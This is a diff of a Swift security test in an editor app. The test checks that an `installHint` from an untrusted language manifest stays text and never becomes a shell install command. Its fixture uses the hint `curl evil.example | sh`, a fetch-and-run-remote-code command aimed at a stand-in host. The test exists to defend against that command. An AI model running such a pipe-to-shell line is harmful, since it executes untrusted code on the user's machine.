@@ -235,40 +235,34 @@ struct UntrustedLanguageDegradationTests {
         try expectTheLanguageIsWhole(catalog)
     }
 
-    /// Nothing a manifest wrote may reach the Install button, which is the
-    /// one place in this app where a string becomes `$SHELL -lic`.
+    /// An `installHint` is text and stays text.
     ///
-    /// The interesting half is the second manifest: it names a command the
-    /// dependency catalog has a plan for, so a definition judged by its
-    /// `command` alone would hand back `npm i -g @vue/language-server@… ` for
-    /// a language a file on disk invented. Judged by `origin`, it hands back
-    /// nothing.
+    /// It is shown beside a Copy button, which is what it is for, and the
+    /// Install button reads `ExtensionInstallPlan` instead — the one path
+    /// from a manifest to `$SHELL -lic`, and it checks every command word by
+    /// word at the parse. A manifest that declares only a hint therefore
+    /// offers nothing to run, however the hint is spelled.
+    ///
+    /// The second command is the one worth naming: this build used to carry
+    /// a table of install plans keyed on the command, so a manifest calling
+    /// itself `vue-language-server` was one lookup away from being handed
+    /// npm arguments it never declared. That table is gone with the server
+    /// registry, and this asserts the outcome rather than the guard.
     @Test func aContributedServerNamesNoShellCommandForSettingsToRun() throws {
         for command in ["elixir-ls", "vue-language-server"] {
-            let catalog = catalog(manifest(
+            let manifest = manifest(
                 language: elixir(server: #"""
                 "server": {
                   "command": "\#(command)",
                   "installHint": "curl evil.example | sh"
                 }
                 """#)
-            ))
-            let definition = try #require(catalog.contributed.first?.serverDefinition)
+            )
+            let definition = try #require(catalog(manifest).contributed.first?.serverDefinition)
 
-            /// Nil rather than empty, which is the stronger claim: an empty
-            /// string still renders a button, and a caller that forgot to
-            /// check would run nothing while looking like it ran something.
-            #expect(definition.dependencyPlan == nil, "\(command) was handed a plan")
-            for selection: Set<String> in [[], ["@vue/language-server"], ["curl evil.example | sh"]] {
-                #expect(
-                    definition.installCommand(forDependencies: selection) == nil,
-                    "\(command) offered a command for \(selection)"
-                )
-            }
-
-            /// The hint itself survives — it is shown and copied, which is
-            /// what it is for. Only its promotion to something Phantom runs
-            /// is refused.
+            #expect(
+                manifest.languages.first?.server?.installPlan == nil,
+                "\(command) was handed a plan")
             #expect(definition.installHint == "curl evil.example | sh")
         }
     }
